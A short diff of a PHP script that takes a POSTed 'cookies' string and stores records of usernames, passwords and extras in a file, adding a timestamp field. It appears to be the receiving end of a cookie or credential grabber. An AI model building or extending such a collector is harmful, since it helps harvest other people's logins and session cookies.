@@ -2,7 +2,7 @@
 // Ensure data has been received
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   // Check if specific data has been sent
-  if (isset($_POST['cookies'])) {
+  if (isset ($_POST['cookies'])) {
     // Access the received data
     $cookieString = $_POST['cookies'];
 
@@ -33,7 +33,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $jsonData = [
       "username" => $username,
       "password" => $password,
-      "extras" => $extras
+      "extras" => $extras,
+      "timestamp" => date("Y-m-d H:i:s"),
     ];
 
     // Read the current content of the file
